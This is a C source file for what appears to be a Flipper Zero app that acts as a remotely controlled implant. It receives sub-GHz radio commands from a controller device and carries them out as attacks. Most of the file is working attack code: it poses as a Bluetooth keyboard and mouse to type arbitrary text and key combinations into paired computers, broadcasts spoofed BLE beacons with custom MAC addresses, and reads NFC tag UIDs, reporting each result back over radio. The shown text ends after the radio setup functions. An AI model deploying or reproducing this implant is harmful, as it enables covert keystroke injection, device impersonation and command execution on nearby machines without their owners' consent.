/**
 * c2_client.c — Flipper Zero C2 Client FAP
 *
 * Standalone app that listens on SubGHz for C2 commands from a controller
 * Flipper (running flipper_mcp with the C2 module) and executes BLE HID
 * injection and beacon spoofing attacks.
 *
 * Protocol: Binary frames over SubGhzTxRxWorker (see shared/c2_protocol.h)
 * Radio: CC1101 internal, default 433.92 MHz
 *
 * For authorized security research only.
 *
 * Build: cd flipper-c2-client && ufbt
 */

#include <furi.h>
#include <gui/gui.h>
#include <gui/view.h>
#include <gui/view_dispatcher.h>
#include <gui/modules/submenu.h>
#include <gui/elements.h>
#include <input/input.h>
#include <notification/notification.h>
#include <notification/notification_messages.h>
#include <bt/bt_service/bt.h>
#include <furi_hal_bt.h>
#include <extra_profiles/hid_profile.h>
#include "hid_usage_keyboard.h"
#include <subghz/devices/devices.h>
#include <subghz/devices/cc1101_int/cc1101_int_interconnect.h>
#include <subghz/subghz_tx_rx_worker.h>
#include <lib/nfc/nfc.h>
#include <lib/nfc/protocols/iso14443_3a/iso14443_3a_poller_sync.h>
#include <lib/nfc/protocols/iso14443_3a/iso14443_3a.h>

#include "../shared/c2_protocol.h"

#include <string.h>
#include <stdio.h>
#include <stdlib.h>

#define TAG "C2Client"

/* EXTRA_BEACON_MAX_DATA_SIZE and EXTRA_BEACON_MAC_ADDR_SIZE already defined in extra_beacon.h */

/* ---------- View IDs ---------------------------------------------------- */

typedef enum {
    ViewIdStatus = 0,
} ViewId;

typedef enum {
    CustomEventRefresh = 0,
} CustomEvent;

/* ---------- App state --------------------------------------------------- */

typedef struct {
    Gui* gui;
    ViewDispatcher* view_dispatcher;
    NotificationApp* notifications;
    View* status_view;

    /* SubGHz C2 radio */
    SubGhzTxRxWorker* worker;
    bool radio_active;
    uint32_t frequency;
    uint32_t rx_count;
    uint32_t tx_count;

    /* BLE state */
    FuriHalBleProfileBase* ble_hid_profile;
    Bt* bt_held;
    bool beacon_active;

    /* Status display */
    char last_cmd[32];
    char error_msg[64];
    FuriTimer* refresh_timer;
    volatile bool running;
} C2ClientApp;

/* ---------- ASCII-to-HID key mapping (US layout) ------------------------ */

typedef struct {
    uint8_t keycode;
    bool shift;
} AsciiToHid;

static const AsciiToHid ascii_hid_map[95] = {
    /* 0x20 ' ' */ {HID_KEYBOARD_SPACEBAR, false},
    /* 0x21 '!' */ {HID_KEYBOARD_1, true},
    /* 0x22 '"' */ {HID_KEYBOARD_APOSTROPHE, true},
    /* 0x23 '#' */ {HID_KEYBOARD_3, true},
    /* 0x24 '$' */ {HID_KEYBOARD_4, true},
    /* 0x25 '%' */ {HID_KEYBOARD_5, true},
    /* 0x26 '&' */ {HID_KEYBOARD_7, true},
    /* 0x27 ''' */ {HID_KEYBOARD_APOSTROPHE, false},
    /* 0x28 '(' */ {HID_KEYBOARD_9, true},
    /* 0x29 ')' */ {HID_KEYBOARD_0, true},
    /* 0x2A '*' */ {HID_KEYBOARD_8, true},
    /* 0x2B '+' */ {HID_KEYBOARD_EQUAL_SIGN, true},
    /* 0x2C ',' */ {HID_KEYBOARD_COMMA, false},
    /* 0x2D '-' */ {HID_KEYBOARD_MINUS, false},
    /* 0x2E '.' */ {HID_KEYBOARD_DOT, false},
    /* 0x2F '/' */ {HID_KEYBOARD_SLASH, false},
    {HID_KEYBOARD_0, false}, {HID_KEYBOARD_1, false}, {HID_KEYBOARD_2, false},
    {HID_KEYBOARD_3, false}, {HID_KEYBOARD_4, false}, {HID_KEYBOARD_5, false},
    {HID_KEYBOARD_6, false}, {HID_KEYBOARD_7, false}, {HID_KEYBOARD_8, false},
    {HID_KEYBOARD_9, false},
    /* 0x3A ':' */ {HID_KEYBOARD_SEMICOLON, true},
    /* 0x3B ';' */ {HID_KEYBOARD_SEMICOLON, false},
    /* 0x3C '<' */ {HID_KEYBOARD_COMMA, true},
    /* 0x3D '=' */ {HID_KEYBOARD_EQUAL_SIGN, false},
    /* 0x3E '>' */ {HID_KEYBOARD_DOT, true},
    /* 0x3F '?' */ {HID_KEYBOARD_SLASH, true},
    /* 0x40 '@' */ {HID_KEYBOARD_2, true},
    {HID_KEYBOARD_A, true}, {HID_KEYBOARD_B, true}, {HID_KEYBOARD_C, true},
    {HID_KEYBOARD_D, true}, {HID_KEYBOARD_E, true}, {HID_KEYBOARD_F, true},
    {HID_KEYBOARD_G, true}, {HID_KEYBOARD_H, true}, {HID_KEYBOARD_I, true},
    {HID_KEYBOARD_J, true}, {HID_KEYBOARD_K, true}, {HID_KEYBOARD_L, true},
    {HID_KEYBOARD_M, true}, {HID_KEYBOARD_N, true}, {HID_KEYBOARD_O, true},
    {HID_KEYBOARD_P, true}, {HID_KEYBOARD_Q, true}, {HID_KEYBOARD_R, true},
    {HID_KEYBOARD_S, true}, {HID_KEYBOARD_T, true}, {HID_KEYBOARD_U, true},
    {HID_KEYBOARD_V, true}, {HID_KEYBOARD_W, true}, {HID_KEYBOARD_X, true},
    {HID_KEYBOARD_Y, true}, {HID_KEYBOARD_Z, true},
    /* 0x5B '[' */ {HID_KEYBOARD_OPEN_BRACKET, false},
    /* 0x5C '\' */ {HID_KEYBOARD_BACKSLASH, false},
    /* 0x5D ']' */ {HID_KEYBOARD_CLOSE_BRACKET, false},
    /* 0x5E '^' */ {HID_KEYBOARD_6, true},
    /* 0x5F '_' */ {HID_KEYBOARD_MINUS, true},
    /* 0x60 '`' */ {HID_KEYBOARD_GRAVE_ACCENT, false},
    {HID_KEYBOARD_A, false}, {HID_KEYBOARD_B, false}, {HID_KEYBOARD_C, false},
    {HID_KEYBOARD_D, false}, {HID_KEYBOARD_E, false}, {HID_KEYBOARD_F, false},
    {HID_KEYBOARD_G, false}, {HID_KEYBOARD_H, false}, {HID_KEYBOARD_I, false},
    {HID_KEYBOARD_J, false}, {HID_KEYBOARD_K, false}, {HID_KEYBOARD_L, false},
    {HID_KEYBOARD_M, false}, {HID_KEYBOARD_N, false}, {HID_KEYBOARD_O, false},
    {HID_KEYBOARD_P, false}, {HID_KEYBOARD_Q, false}, {HID_KEYBOARD_R, false},
    {HID_KEYBOARD_S, false}, {HID_KEYBOARD_T, false}, {HID_KEYBOARD_U, false},
    {HID_KEYBOARD_V, false}, {HID_KEYBOARD_W, false}, {HID_KEYBOARD_X, false},
    {HID_KEYBOARD_Y, false}, {HID_KEYBOARD_Z, false},
    /* 0x7B '{' */ {HID_KEYBOARD_OPEN_BRACKET, true},
    /* 0x7C '|' */ {HID_KEYBOARD_BACKSLASH, true},
    /* 0x7D '}' */ {HID_KEYBOARD_CLOSE_BRACKET, true},
    /* 0x7E '~' */ {HID_KEYBOARD_GRAVE_ACCENT, true},
};

/* ---------- Key lookup helpers ------------------------------------------ */

typedef struct {
    const char* name;
    uint16_t keycode;
} KeyEntry;

static const KeyEntry special_keys[] = {
    {"ENTER", HID_KEYBOARD_RETURN}, {"RETURN", HID_KEYBOARD_RETURN},
    {"TAB", HID_KEYBOARD_TAB}, {"ESC", HID_KEYBOARD_ESCAPE},
    {"ESCAPE", HID_KEYBOARD_ESCAPE}, {"SPACE", HID_KEYBOARD_SPACEBAR},
    {"BACKSPACE", HID_KEYBOARD_DELETE}, {"DELETE", HID_KEYBOARD_DELETE_FORWARD},
    {"INSERT", HID_KEYBOARD_INSERT}, {"HOME", HID_KEYBOARD_HOME},
    {"END", HID_KEYBOARD_END}, {"PAGEUP", HID_KEYBOARD_PAGE_UP},
    {"PAGEDOWN", HID_KEYBOARD_PAGE_DOWN}, {"UP", HID_KEYBOARD_UP_ARROW},
    {"DOWN", HID_KEYBOARD_DOWN_ARROW}, {"LEFT", HID_KEYBOARD_LEFT_ARROW},
    {"RIGHT", HID_KEYBOARD_RIGHT_ARROW},
    {"F1", HID_KEYBOARD_F1}, {"F2", HID_KEYBOARD_F2}, {"F3", HID_KEYBOARD_F3},
    {"F4", HID_KEYBOARD_F4}, {"F5", HID_KEYBOARD_F5}, {"F6", HID_KEYBOARD_F6},
    {"F7", HID_KEYBOARD_F7}, {"F8", HID_KEYBOARD_F8}, {"F9", HID_KEYBOARD_F9},
    {"F10", HID_KEYBOARD_F10}, {"F11", HID_KEYBOARD_F11}, {"F12", HID_KEYBOARD_F12},
    {"PRINTSCREEN", HID_KEYBOARD_PRINT_SCREEN}, {"CAPSLOCK", HID_KEYBOARD_CAPS_LOCK},
};
#define SPECIAL_KEY_COUNT (sizeof(special_keys) / sizeof(special_keys[0]))

static const KeyEntry modifier_keys[] = {
    {"CTRL", HID_KEYBOARD_L_CTRL}, {"CONTROL", HID_KEYBOARD_L_CTRL},
    {"SHIFT", HID_KEYBOARD_L_SHIFT}, {"ALT", HID_KEYBOARD_L_ALT},
    {"GUI", HID_KEYBOARD_L_GUI}, {"WIN", HID_KEYBOARD_L_GUI},
};
#define MODIFIER_KEY_COUNT (sizeof(modifier_keys) / sizeof(modifier_keys[0]))

static uint16_t lookup_special_key(const char* name) {
    for(size_t i = 0; i < SPECIAL_KEY_COUNT; i++) {
        if(strcasecmp(special_keys[i].name, name) == 0) return special_keys[i].keycode;
    }
    return 0;
}

static uint16_t lookup_modifier(const char* name) {
    for(size_t i = 0; i < MODIFIER_KEY_COUNT; i++) {
        if(strcasecmp(modifier_keys[i].name, name) == 0) return modifier_keys[i].keycode;
    }
    return 0;
}

static int hex_to_bytes(const char* hex, uint8_t* out, size_t max_len) __attribute__((unused));
static int hex_to_bytes(const char* hex, uint8_t* out, size_t max_len) {
    size_t hex_len = strlen(hex);
    if(hex_len % 2 != 0) return -1;
    size_t byte_count = hex_len / 2;
    if(byte_count > max_len || byte_count == 0) return -1;
    for(size_t i = 0; i < byte_count; i++) {
        char byte_str[3] = {hex[i * 2], hex[i * 2 + 1], '\0'};
        char* endptr;
        unsigned long val = strtoul(byte_str, &endptr, 16);
        if(*endptr != '\0') return -1;
        out[i] = (uint8_t)val;
    }
    return (int)byte_count;
}

/* ---------- Send C2 response frame -------------------------------------- */

static void send_response(C2ClientApp* app, uint8_t cmd, const char* text) {
    if(!app->worker || !app->radio_active) return;

    uint8_t frame_buf[C2_MAX_FRAME_SIZE];
    size_t text_len = strlen(text);
    if(text_len > C2_MAX_PAYLOAD) text_len = C2_MAX_PAYLOAD;

    size_t frame_len = c2_build_frame(
        frame_buf, cmd, 0, 0, (const uint8_t*)text, (uint8_t)text_len);
    if(frame_len > 0) {
        subghz_tx_rx_worker_write(app->worker, frame_buf, frame_len);
        app->tx_count++;
    }
}

/* ---------- BLE HID command handlers ------------------------------------ */

static void handle_ble_hid_start(C2ClientApp* app, const uint8_t* payload, uint8_t len) {
    if(app->ble_hid_profile) {
        send_response(app, C2_CMD_ERROR, "HID already active");
        return;
    }

    char name[9] = "FlpC2";
    if(len > 0 && len < sizeof(name)) {
        memcpy(name, payload, len);
        name[len] = '\0';
    }

    BleProfileHidParams params = {
        .device_name_prefix = name,
        .mac_xor = 0,
    };

    Bt* bt = furi_record_open(RECORD_BT);
    app->bt_held = bt;

    app->ble_hid_profile =
        bt_profile_start(bt, ble_profile_hid, (FuriHalBleProfileParams)&params);
    if(!app->ble_hid_profile) {
        furi_record_close(RECORD_BT);
        app->bt_held = NULL;
        send_response(app, C2_CMD_ERROR, "Failed to start HID profile");
        return;
    }

    char result[64];
    snprintf(result, sizeof(result), "HID started as '%s'", name);
    send_response(app, C2_CMD_RESULT, result);
    snprintf(app->last_cmd, sizeof(app->last_cmd), "HID: %s", name);
    FURI_LOG_I(TAG, "BLE HID started as '%s'", name);
}

static void handle_ble_hid_type(C2ClientApp* app, const uint8_t* payload, uint8_t len) {
    if(!app->ble_hid_profile) {
        send_response(app, C2_CMD_ERROR, "HID not active");
        return;
    }

    size_t typed = 0;
    for(uint8_t i = 0; i < len; i++) {
        char c = (char)payload[i];
        /* Handle escaped \n as ENTER */
        if(c == '\\' && i + 1 < len && payload[i + 1] == 'n') {
            ble_profile_hid_kb_press(app->ble_hid_profile, HID_KEYBOARD_RETURN);
            furi_delay_ms(30);
            ble_profile_hid_kb_release(app->ble_hid_profile, HID_KEYBOARD_RETURN);
            furi_delay_ms(30);
            i++;
            typed++;
            continue;
        }
        if(c < 0x20 || c > 0x7E) continue;

        const AsciiToHid* entry = &ascii_hid_map[c - 0x20];
        if(entry->shift) {
            ble_profile_hid_kb_press(app->ble_hid_profile, HID_KEYBOARD_L_SHIFT);
            furi_delay_ms(5);
        }
        ble_profile_hid_kb_press(app->ble_hid_profile, entry->keycode);
        furi_delay_ms(30);
        ble_profile_hid_kb_release(app->ble_hid_profile, entry->keycode);
        if(entry->shift) {
            ble_profile_hid_kb_release(app->ble_hid_profile, HID_KEYBOARD_L_SHIFT);
        }
        furi_delay_ms(30);
        typed++;
    }

    ble_profile_hid_kb_release_all(app->ble_hid_profile);
    char result[64];
    snprintf(result, sizeof(result), "Typed %zu chars", typed);
    send_response(app, C2_CMD_RESULT, result);
    snprintf(app->last_cmd, sizeof(app->last_cmd), "TYPE: %zu ch", typed);
    FURI_LOG_I(TAG, "HID type: %zu chars sent", typed);
}

static void handle_ble_hid_press(C2ClientApp* app, const uint8_t* payload, uint8_t len) {
    if(!app->ble_hid_profile) {
        send_response(app, C2_CMD_ERROR, "HID not active");
        return;
    }

    char combo[64];
    size_t copy_len = len < sizeof(combo) - 1 ? len : sizeof(combo) - 1;
    memcpy(combo, payload, copy_len);
    combo[copy_len] = '\0';

    uint16_t modifiers[4] = {0};
    int mod_count = 0;
    uint16_t main_key = 0;

    const char* p = combo;
    while(*p) {
        while(*p == ' ' || *p == '+') p++;
        if(!*p) break;
        const char* tok_start = p;
        while(*p && *p != '+') p++;
        const char* tok_end = p;
        while(tok_end > tok_start && *(tok_end - 1) == ' ') tok_end--;
        size_t tok_len = tok_end - tok_start;
        if(tok_len == 0) continue;

        char token[32];
        if(tok_len >= sizeof(token)) tok_len = sizeof(token) - 1;
        memcpy(token, tok_start, tok_len);
        token[tok_len] = '\0';

        uint16_t mod = lookup_modifier(token);
        if(mod) {
            if(mod_count < 4) modifiers[mod_count++] = mod;
        } else {
            uint16_t special = lookup_special_key(token);
            if(special) {
                main_key = special;
            } else if(tok_len == 1 && token[0] >= 0x20 && token[0] <= 0x7E) {
                const AsciiToHid* entry = &ascii_hid_map[(uint8_t)token[0] - 0x20];
                main_key = entry->keycode;
                if(entry->shift && mod_count < 4) modifiers[mod_count++] = HID_KEYBOARD_L_SHIFT;
            }
        }
    }

    for(int i = 0; i < mod_count; i++) {
        ble_profile_hid_kb_press(app->ble_hid_profile, modifiers[i]);
        furi_delay_ms(5);
    }
    if(main_key) {
        ble_profile_hid_kb_press(app->ble_hid_profile, main_key);
        furi_delay_ms(50);
        ble_profile_hid_kb_release(app->ble_hid_profile, main_key);
    }
    for(int i = mod_count - 1; i >= 0; i--) {
        ble_profile_hid_kb_release(app->ble_hid_profile, modifiers[i]);
    }

    char result[64];
    snprintf(result, sizeof(result), "Key pressed: %.49s", combo);
    send_response(app, C2_CMD_RESULT, result);
    snprintf(app->last_cmd, sizeof(app->last_cmd), "KEY: %.26s", combo);
    FURI_LOG_I(TAG, "HID key press: %s", combo);
}

static void handle_ble_hid_mouse(C2ClientApp* app, const uint8_t* payload, uint8_t len) {
    if(!app->ble_hid_profile) {
        send_response(app, C2_CMD_ERROR, "HID not active");
        return;
    }
    if(len < C2_MOUSE_PAYLOAD_SIZE) {
        send_response(app, C2_CMD_ERROR, "Mouse payload too short");
        return;
    }

    int8_t dx = (int8_t)payload[C2_MOUSE_OFFSET_DX];
    int8_t dy = (int8_t)payload[C2_MOUSE_OFFSET_DY];
    uint8_t button = payload[C2_MOUSE_OFFSET_BUTTON];
    uint8_t action = payload[C2_MOUSE_OFFSET_ACTION];
    int8_t scroll = (int8_t)payload[C2_MOUSE_OFFSET_SCROLL];

    if(dx != 0 || dy != 0) {
        ble_profile_hid_mouse_move(app->ble_hid_profile, dx, dy);
    }
    if(scroll != 0) {
        ble_profile_hid_mouse_scroll(app->ble_hid_profile, scroll);
    }
    if(button > 0) {
        uint8_t btn_mask = 0;
        if(button == 1) btn_mask = HID_MOUSE_BTN_LEFT;
        else if(button == 2) btn_mask = HID_MOUSE_BTN_RIGHT;
        else if(button == 3) btn_mask = HID_MOUSE_BTN_WHEEL;

        if(action == 0) { /* click */
            ble_profile_hid_mouse_press(app->ble_hid_profile, btn_mask);
            furi_delay_ms(50);
            ble_profile_hid_mouse_release(app->ble_hid_profile, btn_mask);
        } else if(action == 1) { /* press */
            ble_profile_hid_mouse_press(app->ble_hid_profile, btn_mask);
        } else if(action == 2) { /* release */
            ble_profile_hid_mouse_release(app->ble_hid_profile, btn_mask);
        }
    }

    send_response(app, C2_CMD_RESULT, "Mouse OK");
    snprintf(app->last_cmd, sizeof(app->last_cmd), "MOUSE: %d,%d", dx, dy);
    FURI_LOG_I(TAG, "HID mouse: dx=%d dy=%d btn=%u action=%u scroll=%d", dx, dy, button, action, (int)scroll);
}

static void handle_ble_hid_stop(C2ClientApp* app) {
    if(!app->ble_hid_profile) {
        send_response(app, C2_CMD_RESULT, "HID not active");
        return;
    }

    ble_profile_hid_kb_release_all(app->ble_hid_profile);
    ble_profile_hid_mouse_release_all(app->ble_hid_profile);

    if(app->bt_held) {
        bt_profile_restore_default(app->bt_held);
        furi_record_close(RECORD_BT);
    }
    app->ble_hid_profile = NULL;
    app->bt_held = NULL;

    send_response(app, C2_CMD_RESULT, "HID stopped");
    snprintf(app->last_cmd, sizeof(app->last_cmd), "HID stopped");
    FURI_LOG_I(TAG, "BLE HID stopped");
}

/* ---------- BLE Beacon command handlers --------------------------------- */

static void handle_ble_beacon_start(C2ClientApp* app, const uint8_t* payload, uint8_t len) {
    if(len < 1) {
        send_response(app, C2_CMD_ERROR, "Beacon payload empty");
        return;
    }

    /* Parse payload: [0]=adv_len, [1..N]=adv_data, [N+1..N+6]=MAC, [N+7..N+8]=interval */
    uint8_t adv_len = payload[0];
    if(adv_len > EXTRA_BEACON_MAX_DATA_SIZE || adv_len == 0 || 1 + adv_len > len) {
        send_response(app, C2_CMD_ERROR, "Invalid adv data length");
        return;
    }

    const uint8_t* adv_data = payload + 1;
    uint8_t mac[EXTRA_BEACON_MAC_ADDR_SIZE] = {0xDE, 0xAD, 0xBE, 0xEF, 0x00, 0x01};
    uint16_t interval = 100;
    bool custom_mac = false;

    size_t offset = 1 + adv_len;
    if(offset + 6 <= len) {
        memcpy(mac, payload + offset, 6);
        custom_mac = true;
        offset += 6;
    }
    if(offset + 2 <= len) {
        interval = (uint16_t)((payload[offset] << 8) | payload[offset + 1]);
        if(interval < 20) interval = 20;
        if(interval > 10240) interval = 10240;
    }

    if(furi_hal_bt_extra_beacon_is_active()) {
        furi_hal_bt_extra_beacon_stop();
    }

    GapExtraBeaconConfig config = {
        .min_adv_interval_ms = interval,
        .max_adv_interval_ms = interval,
        .adv_channel_map = GapAdvChannelMapAll,
        .adv_power_level = GapAdvPowerLevel_0dBm,
        .address_type = custom_mac ? GapAddressTypePublic : GapAddressTypeRandom,
    };
    memcpy(config.address, mac, EXTRA_BEACON_MAC_ADDR_SIZE);

    if(!furi_hal_bt_extra_beacon_set_config(&config)) {
        send_response(app, C2_CMD_ERROR, "Failed to set beacon config");
        return;
    }
    if(!furi_hal_bt_extra_beacon_set_data(adv_data, adv_len)) {
        send_response(app, C2_CMD_ERROR, "Failed to set beacon data");
        return;
    }
    if(!furi_hal_bt_extra_beacon_start()) {
        send_response(app, C2_CMD_ERROR, "Failed to start beacon");
        return;
    }

    app->beacon_active = true;

    char result[64];
    snprintf(result, sizeof(result), "Beacon started: %d bytes, %dms interval", adv_len, interval);
    send_response(app, C2_CMD_RESULT, result);
    snprintf(app->last_cmd, sizeof(app->last_cmd), "BEACON: %dB", adv_len);
    FURI_LOG_I(TAG, "BLE beacon started: %d bytes adv data, %d ms interval, custom_mac=%d",
               adv_len, interval, custom_mac);
}

static void handle_ble_beacon_stop(C2ClientApp* app) {
    if(furi_hal_bt_extra_beacon_is_active()) {
        furi_hal_bt_extra_beacon_stop();
    }
    app->beacon_active = false;
    send_response(app, C2_CMD_RESULT, "Beacon stopped");
    snprintf(app->last_cmd, sizeof(app->last_cmd), "BEACON off");
    FURI_LOG_I(TAG, "BLE beacon stopped");
}

/* ---------- NFC tag read ------------------------------------------------- */

static void handle_nfc_read(C2ClientApp* app) {
    snprintf(app->last_cmd, sizeof(app->last_cmd), "NFC read...");

    Nfc* nfc = nfc_alloc();
    if(!nfc) {
        send_response(app, C2_CMD_ERROR, "NFC init failed");
        FURI_LOG_E(TAG, "NFC alloc failed");
        return;
    }

    Iso14443_3aData data = {};
    Iso14443_3aError err = iso14443_3a_poller_sync_read(nfc, &data);
    nfc_free(nfc);

    if(err == Iso14443_3aErrorNone) {
        /* Format: "UID:XX:XX:XX:XX SAK:XX ATQA:XXXX" */
        char uid_hex[32] = {0};
        int uid_off = 0;
        for(uint8_t i = 0; i < data.uid_len && uid_off < (int)sizeof(uid_hex) - 3; i++) {
            uid_off += snprintf(
                uid_hex + uid_off,
                sizeof(uid_hex) - uid_off,
                i ? ":%02X" : "%02X",
                data.uid[i]);
        }
        char result[96];
        snprintf(
            result,
            sizeof(result),
            "UID:%s SAK:%02X ATQA:%02X%02X",
            uid_hex,
            data.sak,
            data.atqa[0],
            data.atqa[1]);
        send_response(app, C2_CMD_RESULT, result);
        snprintf(app->last_cmd, sizeof(app->last_cmd), "NFC:%.27s", uid_hex);
        FURI_LOG_I(TAG, "NFC read OK: %s", result);
    } else {
        send_response(app, C2_CMD_ERROR, "NFC: no tag detected");
        snprintf(app->last_cmd, sizeof(app->last_cmd), "NFC: no tag");
        FURI_LOG_W(TAG, "NFC read error: %d", err);
    }
}

/* ---------- Status report ----------------------------------------------- */

static void handle_status_request(C2ClientApp* app) {
    char status[128];
    snprintf(
        status,
        sizeof(status),
        "free_heap: %zu\nhid: %s\nbeacon: %s\nrx: %lu\ntx: %lu",
        memmgr_get_free_heap(),
        app->ble_hid_profile ? "active" : "inactive",
        app->beacon_active ? "active" : "inactive",
        app->rx_count,
        app->tx_count);
    send_response(app, C2_CMD_STATUS, status);
    FURI_LOG_I(TAG, "Status sent: hid=%s beacon=%s rx=%lu tx=%lu",
               app->ble_hid_profile ? "active" : "inactive",
               app->beacon_active ? "active" : "inactive",
               app->rx_count, app->tx_count);
}

/* ---------- C2 frame dispatch ------------------------------------------- */

static void process_c2_frame(C2ClientApp* app, const uint8_t* buf, size_t len) {
    uint8_t cmd, seq, flags, payload_len;
    const uint8_t* payload;

    if(!c2_parse_frame(buf, len, &cmd, &seq, &flags, &payload, &payload_len)) {
        FURI_LOG_W(TAG, "Invalid C2 frame (%zu bytes)", len);
        return;
    }

    app->rx_count++;
    FURI_LOG_I(TAG, "C2 RX: cmd=%s seq=%u len=%u", c2_cmd_name(cmd), seq, payload_len);

    /* Send ACK if requested */
    if(flags & C2_FLAG_ACK_REQ) {
        uint8_t ack_buf[C2_MAX_FRAME_SIZE];
        size_t ack_len = c2_build_ack(ack_buf, seq);
        subghz_tx_rx_worker_write(app->worker, ack_buf, ack_len);
        app->tx_count++;
    }

    switch(cmd) {
    case C2_CMD_PING:
        send_response(app, C2_CMD_PONG, "");
        snprintf(app->last_cmd, sizeof(app->last_cmd), "PING");
        break;
    case C2_CMD_BLE_HID_START:
        handle_ble_hid_start(app, payload, payload_len);
        break;
    case C2_CMD_BLE_HID_TYPE:
        handle_ble_hid_type(app, payload, payload_len);
        break;
    case C2_CMD_BLE_HID_PRESS:
        handle_ble_hid_press(app, payload, payload_len);
        break;
    case C2_CMD_BLE_HID_MOUSE:
        handle_ble_hid_mouse(app, payload, payload_len);
        break;
    case C2_CMD_BLE_HID_STOP:
        handle_ble_hid_stop(app);
        break;
    case C2_CMD_BLE_BEACON_START:
        handle_ble_beacon_start(app, payload, payload_len);
        break;
    case C2_CMD_BLE_BEACON_STOP:
        handle_ble_beacon_stop(app);
        break;
    case C2_CMD_NFC_READ:
        handle_nfc_read(app);
        break;
    case C2_CMD_STATUS:
        handle_status_request(app);
        break;
    default: {
        uint8_t nack_buf[C2_MAX_FRAME_SIZE];
        size_t nack_len = c2_build_nack(nack_buf, seq, C2_ERR_UNKNOWN_CMD);
        subghz_tx_rx_worker_write(app->worker, nack_buf, nack_len);
        app->tx_count++;
        FURI_LOG_W(TAG, "Unknown C2 cmd: 0x%02X", cmd);
        break;
    }
    }
}

/* ---------- SubGHz RX callback ------------------------------------------ */

/* SDK signature: void (*)(void* context) — worker accessed via app struct */
static void c2_rx_callback(void* context) {
    C2ClientApp* app = (C2ClientApp*)context;

    uint8_t rx_buf[C2_MAX_FRAME_SIZE];
    while(subghz_tx_rx_worker_available(app->worker) >= C2_MIN_FRAME_SIZE) {
        size_t avail = subghz_tx_rx_worker_available(app->worker);
        if(avail > sizeof(rx_buf)) avail = sizeof(rx_buf);

        size_t read = subghz_tx_rx_worker_read(app->worker, rx_buf, avail);
        if(read >= C2_MIN_FRAME_SIZE) {
            process_c2_frame(app, rx_buf, read);
        }
    }
}

/* ---------- Periodic refresh -------------------------------------------- */

static void refresh_timer_cb(void* context) {
    C2ClientApp* app = (C2ClientApp*)context;
    view_dispatcher_send_custom_event(app->view_dispatcher, CustomEventRefresh);
}

static bool custom_event_cb(void* context, uint32_t event) {
    C2ClientApp* app = (C2ClientApp*)context;
    UNUSED(event);
    /* Commit model with update=true to force a redraw */
    with_view_model(app->status_view, C2ClientApp** model, { UNUSED(model); }, true);
    return true;
}

/* ---------- GUI callbacks ----------------------------------------------- */

static void draw_status(Canvas* canvas, void* model) {
    C2ClientApp** app_ptr = (C2ClientApp**)model;
    C2ClientApp* app = *app_ptr;

    canvas_clear(canvas);

    /* ---- Header bar (filled rect, white text) -------------------------- */
    canvas_set_color(canvas, ColorBlack);
    canvas_draw_box(canvas, 0, 0, 128, 13);
    canvas_set_color(canvas, ColorWhite);
    canvas_set_font(canvas, FontPrimary);
    canvas_draw_str(canvas, 2, 11, "C2 Client");
    /* Radio activity indicator: filled disc = active, outline = off/error */
    if(app->radio_active) {
        canvas_draw_disc(canvas, 121, 6, 4);
    } else {
        canvas_draw_circle(canvas, 121, 6, 4);
    }
    canvas_set_color(canvas, ColorBlack);

    /* ---- Separator line ----------------------------------------------- */
    canvas_draw_line(canvas, 0, 13, 127, 13);

    canvas_set_font(canvas, FontSecondary);

    /* ---- Error mode: show message and exit hint ----------------------- */
    if(app->error_msg[0]) {
        canvas_draw_str_aligned(canvas, 64, 32, AlignCenter, AlignCenter, app->error_msg);
        canvas_draw_str_aligned(canvas, 64, 56, AlignCenter, AlignCenter, "Back = exit");
        return;
    }

    /* ---- Status lines (9 px spacing) ---------------------------------- */
    char line[48];

    /* Line 1: frequency */
    snprintf(
        line, sizeof(line),
        "RF: %lu.%03lu MHz",
        (unsigned long)(app->frequency / 1000000UL),
        (unsigned long)((app->frequency % 1000000UL) / 1000UL));
    canvas_draw_str(canvas, 2, 24, line);

    /* Line 2: RX / TX counters */
    snprintf(line, sizeof(line), "RX: %lu  TX: %lu", app->rx_count, app->tx_count);
    canvas_draw_str(canvas, 2, 34, line);

    /* Line 3: HID and beacon state */
    snprintf(
        line, sizeof(line),
        "HID: %s  BCN: %s",
        app->ble_hid_profile ? "ON " : "off",
        app->beacon_active ? "ON " : "off");
    canvas_draw_str(canvas, 2, 44, line);

    /* Line 4: last command with arrow prefix */
    snprintf(line, sizeof(line), "> %s", app->last_cmd[0] ? app->last_cmd : "Listening...");
    canvas_draw_str(canvas, 2, 54, line);
}

static bool input_status(InputEvent* event, void* context) {
    C2ClientApp* app = (C2ClientApp*)context;
    if(event->type == InputTypeShort && event->key == InputKeyBack) {
        app->running = false;
        view_dispatcher_stop(app->view_dispatcher);
        return true;
    }
    return false;
}

/* ---------- Radio lifecycle --------------------------------------------- */

static bool start_radio(C2ClientApp* app) {
    /* NOTE: The internal CC1101's begin() vtable entry is NULL (confirmed by
     * firmware disassembly) — do NOT call subghz_devices_begin() for
     * SUBGHZ_DEVICE_CC1101_INT_NAME.  The TxRx worker manages the radio
     * lifecycle internally via its worker thread. */
    subghz_devices_init();
    const SubGhzDevice* device = subghz_devices_get_by_name(SUBGHZ_DEVICE_CC1101_INT_NAME);
    if(!device) {
        FURI_LOG_E(TAG, "CC1101 device not found");
        snprintf(app->error_msg, sizeof(app->error_msg), "CC1101 not found");
        subghz_devices_deinit();
        return false;
    }

    if(!subghz_devices_is_frequency_valid(device, app->frequency)) {
        FURI_LOG_E(TAG, "Invalid frequency: %lu Hz", app->frequency);
        snprintf(app->error_msg, sizeof(app->error_msg), "Invalid freq: %lu Hz", app->frequency);
        subghz_devices_deinit();
        return false;
    }

    app->worker = subghz_tx_rx_worker_alloc();
    /* subghz_tx_rx_worker_start returns false when the frequency is not
     * permitted by the Flipper's configured region (furi_hal_region check). */
    if(!subghz_tx_rx_worker_start(app->worker, device, app->frequency)) {
        FURI_LOG_E(TAG, "Worker start failed — freq blocked by region?");
        snprintf(app->error_msg, sizeof(app->error_msg), "Freq blocked by region");
        subghz_tx_rx_worker_free(app->worker);
        app->worker = NULL;
        subghz_devices_deinit();
        return false;
    }

    subghz_tx_rx_worker_set_callback_have_read(app->worker, c2_rx_callback, app);
    app->radio_active = true;

    FURI_LOG_I(
        TAG,
        "Radio started at %lu.%03lu MHz",
        (unsigned long)(app->frequency / 1000000UL),
        (unsigned long)((app->frequency % 1000000UL) / 1000UL));
    return true;
}

static void stop_radio(C2ClientApp* app) {
    if(app->worker) {
        if(subghz_tx_rx_worker_is_running(app->worker)) {
            subghz_tx_rx_worker_stop(app->worker);
        }
        subghz_tx_rx_worker_free(app->worker);
        app->worker = NULL;
    }
    app->radio_active = false;
    subghz_devices_deinit();
    FURI_LOG_I(TAG, "Radio stopped");
}

